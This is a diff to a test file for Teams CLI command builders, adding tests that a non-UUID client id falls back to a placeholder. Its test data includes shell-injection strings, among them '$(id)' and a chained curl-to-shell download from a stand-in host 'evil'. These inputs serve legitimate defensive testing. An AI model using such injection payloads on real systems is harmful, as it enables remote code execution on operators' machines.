@@ -3,6 +3,7 @@ import {
   LOCAL_TEAMS_ENDPOINT_ORIGIN,
   TEAMS_APP_NAME_MAX_LENGTH,
   buildTeamsAppCreateCommand,
+  buildTeamsPackageDownloadCommand,
   buildTeamsSupportsFilesCommand,
   canGenerateTeamsCommand,
   teamsAppNameError,
@@ -107,8 +108,11 @@ describe('buildTeamsAppCreateCommand sign-in audience', () => {
 
 describe('buildTeamsSupportsFilesCommand', () => {
   it('includes --yes, without which the update silently does nothing', () => {
-    expect(buildTeamsSupportsFilesCommand('abc-123')).toBe(
-      "teams app manifest update abc-123 --set-json 'bots[0].supportsFiles=true' --yes"
+    // A real UUID: the builder now falls back to the placeholder for anything
+    // else, so 'abc-123' would no longer exercise the interpolation path.
+    const appId = '0cd0e1e6-adf7-40f4-952f-79006d320a05'
+    expect(buildTeamsSupportsFilesCommand(appId)).toBe(
+      `teams app manifest update ${appId} --set-json 'bots[0].supportsFiles=true' --yes`
     )
   })
 
@@ -140,6 +144,47 @@ describe('teamsInstallUrl', () => {
   })
 
   it('trims, since pasted ids often carry whitespace', () => {
-    expect(teamsInstallUrl(`  ${APP} `, ` ${TENANT}  `)).toContain(APP)
+    // toContain(APP) would pass on a URL that still carried the surrounding
+    // spaces, since APP is a substring of the padded value. Only an exact match
+    // proves the href is actually resolvable.
+    expect(teamsInstallUrl(`  ${APP} `, ` ${TENANT}  `)).toBe(
+      `https://teams.microsoft.com/l/app/${APP}?installAppPackage=true&appTenantId=${TENANT}`
+    )
+  })
+})
+
+describe('command builders reject a non-UUID app id', () => {
+  const APP = '0cd0e1e6-adf7-40f4-952f-79006d320a05'
+
+  // These commands are rendered live from the CLIENT_ID field and handed to a
+  // Copy button, and the operator pastes them into a shell. The field is free
+  // text until submit, and the value is often pasted from whoever ran
+  // `teams app create`. teamsInstallUrl already refuses a non-UUID; these two
+  // trusted the same field blindly.
+  it.each([
+    ['command substitution', '$(id)'],
+    ['a chained command', 'abc; curl -s http://evil/x | sh'],
+    ['backticks', '`id`'],
+    ['a half-typed id', '0cd0e1e6'],
+  ])('falls back to the placeholder for %s', (_label, hostile) => {
+    for (const cmd of [
+      buildTeamsSupportsFilesCommand(hostile),
+      buildTeamsPackageDownloadCommand(hostile),
+    ]) {
+      expect(cmd).toContain('YOUR_CLIENT_ID')
+      expect(cmd).not.toContain(hostile)
+      expect(cmd).not.toMatch(/[;`$|]/)
+    }
+  })
+
+  it('still emits a real UUID unchanged', () => {
+    expect(buildTeamsSupportsFilesCommand(APP)).toBe(
+      `teams app manifest update ${APP} --set-json 'bots[0].supportsFiles=true' --yes`
+    )
+    expect(buildTeamsPackageDownloadCommand(APP)).toBe(`teams app package download ${APP}`)
+  })
+
+  it('trims a padded UUID rather than rejecting it', () => {
+    expect(buildTeamsPackageDownloadCommand(`  ${APP}  `)).toBe(`teams app package download ${APP}`)
   })
 })
